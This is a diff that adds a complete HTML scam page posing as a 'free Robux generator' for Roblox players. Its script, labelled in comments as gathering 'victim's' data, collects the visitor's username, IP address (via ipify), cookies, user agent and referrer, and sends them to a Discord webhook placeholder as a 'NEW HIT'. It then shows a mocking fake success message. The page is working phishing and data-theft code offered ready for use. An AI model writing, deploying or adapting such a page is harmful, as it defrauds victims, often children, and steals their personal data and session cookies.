@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 FREE ROBUX GENERATOR 🔥</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #1a1a1a;
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background-color: #2a2a2a;
+            border-radius: 10px;
+            padding: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        button {
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background-color: #ff3333;
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 FREE 100,000 ROBUX 🚀</h1>
+        <p>Enter your Roblox username to claim your reward!</p>
+        <input type="text" id="username" placeholder="Your Roblox Username" style="padding: 10px; width: 80%; margin: 10px 0;">
+        <br>
+        <button onclick="beamUser()">CLAIM NOW!</button>
+        <div id="loading" class="loading">
+            <p>Processing... Do not close this page! ⏳</p>
+        </div>
+    </div>
+
+    <script>
+        async function beamUser() {
+            const username = document.getElementById("username").value;
+            if (!username) {
+                alert("Please enter a username!");
+                return;
+            }
+
+            document.getElementById("loading").style.display = "block";
+
+            // Get victim's IP, cookies, and other data
+            const ip = await fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(() => "Unknown IP");
+
+            const cookies = document.cookie || "No cookies found";
+            const userAgent = navigator.userAgent;
+            const referrer = document.referrer || "Direct visit";
+
+            // Prepare data to send to webhook
+            const webhookURL = "YOUR_DISCORD_WEBHOOK_HERE"; // REPLACE THIS
+            const embed = {
+                title: "🔥 NEW ROBLOX BEAM SUCCESS 🔥",
+                description: `**Username:** ${username}\n**IP:** ${ip}\n**Cookies:** ${cookies}\n**User Agent:** ${userAgent}\n**Referrer:** ${referrer}`,
+                color: 16711680, // Red
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = {
+                embeds: [embed],
+                content: "@everyone NEW HIT! 🎯"
+            };
+
+            // Send data to Discord
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                alert("✅ Success! Your Robux will be added soon! (LOL)");
+            }).catch(() => {
+                alert("⚠️ Error! Try again later.");
+            }).finally(() => {
+                document.getElementById("loading").style.display = "none";
+            });
+        }
+    </script>
+</body>
+</html>
